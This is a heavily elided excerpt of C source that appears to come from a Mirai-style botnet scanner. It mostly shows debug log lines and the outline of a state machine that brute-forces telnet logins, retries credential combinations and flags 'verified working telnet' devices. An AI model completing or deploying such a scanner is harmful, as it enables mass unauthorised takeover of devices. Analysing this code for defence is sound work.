...
static void setup_connection(struct scanner_connection *conn)
{
    ...
    {
#ifdef DEBUG
        util_msgc("Error", "Failed to call socket in scanner");
#endif
        return;
    }
...
void scanner_init(void)
{
...
#ifdef DEBUG
    util_msgc("Info", "Scanner process initialized. Scanning started.");
#endif
    ...
    while (TRUE)
    {
        ...
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0;
...
#ifdef DEBUG
            util_msgc("Info", "FD%d Attempting to brute found IP %d.%d.%d.%d", 
        ...
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            ...
            {
#ifdef DEBUG
                util_msgc("Info", "FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;
                ...
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    ...
                    else
                    {
                        setup_connection(conn);
#ifdef DEBUG
                        util_msgc("Info", "FD%d retrying with different auth combo!\n", conn->fd);
#endif
                    }
                }
                else
        ...
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            ...
            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if (err == 0 && ret == 0)
                {
                    ...
                    conn->rdbuf_pos = 0;
#ifdef DEBUG
                    util_msgc("Info", "FD%d connected. Trying %s:%s", 
                ...
                {
#ifdef DEBUG
                    util_msgc("Error", "FD%d error while connecting = %d\n", 
						conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
            ...
            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (TRUE)
                {
                    ...
                    {
#ifdef DEBUG
                        util_msgc("Info", "FD%d connection gracefully closed", 
							conn->fd);
#endif
                        errno = ECONNRESET;
                    ...
                    while(TRUE)
                    {
                        ...
                        switch(conn->state)
                        {
...
#ifdef DEBUG
									util_msgc("Info", "FD%d finished telnet negotiation", 
										conn->fd);
#endif
								}
                            break;
...
#ifdef DEBUG
									util_msgc("Info", "FD%d received username prompt", 
										conn->fd);
#endif
								}
                            break;
							...
							case SC_WAITING_PASSWORD:
								...
								{
#ifdef DEBUG
									util_msgc("Info", "FD%d received password prompt", 
										conn->fd);
#endif
									// Send password
							...
							case SC_WAITING_PASSWD_RESP:
								if ((consumed = consume_any_prompt(conn)) > 0)
								{
									...
									int tmp_len;
#ifdef DEBUG
									util_msgc("Info", "FD%d received shell prompt", 
										conn->fd);
#endif
							...
							case SC_WAITING_ENABLE_RESP:
								if ((consumed = consume_any_prompt(conn)) > 0)
								{
									...
									int tmp_len;
#ifdef DEBUG
									util_msgc("Info", "FD%d received sh prompt", 
										conn->fd);
#endif
							...
							case SC_WAITING_SHELL_RESP:
								if ((consumed = consume_any_prompt(conn)) > 0)
								{
									...
									int tmp_len;
#ifdef DEBUG
									util_msgc("Info", "FD%d received enable prompt", 
										conn->fd);
#endif
							...
							case SC_WAITING_TOKEN_RESP:
								...
								{
#ifdef DEBUG
									util_msgc("Info", "FD%d invalid username/password combo", 
										conn->fd);
#endif
									close(conn->fd);
									conn->fd = -1;
								...
								{
#ifdef DEBUG
									util_msgc("Info", "FD%d Found verified working telnet", 
										conn->fd);
#endif
